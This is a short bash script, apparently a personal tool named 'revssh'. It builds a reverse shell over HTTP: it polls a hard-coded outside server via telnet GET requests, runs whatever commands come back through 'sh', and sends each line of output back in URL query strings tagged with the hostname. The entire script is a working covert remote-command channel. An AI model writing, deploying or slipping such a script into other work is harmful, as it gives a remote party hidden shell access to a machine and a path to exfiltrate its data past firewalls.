# #!/bin/bash -x
## TODO: Output should be clumped together, not one request per line
##       Could we use HTML upload instead of post/get?
SERVER="hwi.ath.cx"
URL="/cgi-bin/joey/revssh"

SESSID=`hostname`"_$$"

mycat() {
	while read Y
	do
		echo "$Y" >&2
		echo "$Y"
	done
}

# COM="wget -O -"
# COM="lynx -source"
telnetget() {
	if test "$1" = "-quick"; then SLEEPCOM="sleep 30"; shift; else SLEEPCOM="cat"; fi
	URLHOST=`echo "$1" | sed 's+^http://\([^/]*\).*+\1+'`
	URLREQ=`echo "$1" | tr ' ' '+'`
	# echo "--------- Trying to get" >&2
	# printf "%s\n\n" "GET $URLREQ HTTP/1.0" >&2
	( printf "%s\n\n" "GET $URLREQ HTTP/1.0"; $SLEEPCOM ) |
	telnet "$URLHOST" 80 2>/dev/null |
	while read X; do if test "$X" = ""; then mycat; fi done &
}
COM1="telnetget"
COM2="telnetget -quick"

$COM1 "http://$SERVER$URL?sessid=$SESSID&init=true" |

sh |

while read LINE; do
	$COM2 "http://$SERVER$URL?sessid=$SESSID&output=$LINE"
done
